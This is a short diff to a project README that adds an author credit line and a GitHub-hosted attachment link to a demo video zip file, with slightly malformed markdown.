@@ -83,7 +83,11 @@ Record demo, collect feedback, and plan future enhancements for portfolio/GitHub
 
 
 
-Built and maintained by YELURI SAHITHI NAVYA
+Built and maintained by YELURI SAHITHI NAVYA  
+
+
+
+[demo_v)ideo.zip](https://github.com/user-attachments/files/22559116/demo_video.zip
 
 
 
